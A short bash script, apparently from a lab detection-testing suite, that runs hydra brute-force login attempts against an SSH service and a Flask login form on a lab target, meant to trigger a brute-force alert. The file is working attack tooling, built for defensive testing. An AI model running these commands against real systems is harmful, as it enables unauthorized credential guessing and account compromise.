#!/bin/bash
# 02_bruteforce.sh — password guessing against SSH and the Flask login form.
# Expected detection: SX-BRUTE-FORCE (T1110.001, high).
#
# Usage: TARGET=target ./02_bruteforce.sh
set -euo pipefail

TARGET="${TARGET:-127.0.0.1}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PASSLIST="${SCRIPT_DIR}/passwords.txt"

echo "=== [02] Brute force: hydra SSH login guesses against ${TARGET}:2222 ==="
hydra -L "$PASSLIST" -p lab12345 "ssh://${TARGET}:2222" -t 4 -f \
    || echo "[02] SSH hydra finished (non-zero exit is normal when no match)"

echo "=== [02] Brute force: hydra HTTP POST form guesses against ${TARGET}:5000/login ==="
# The Flask app's form fields are user= and pass=; failure page says "Invalid".
hydra -L "$PASSLIST" -p wrongpass "${TARGET}" \
    http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -s 5000 -t 8 \
    || echo "[02] HTTP hydra finished (non-zero exit is normal when no match)"

echo "=== [02] done ==="
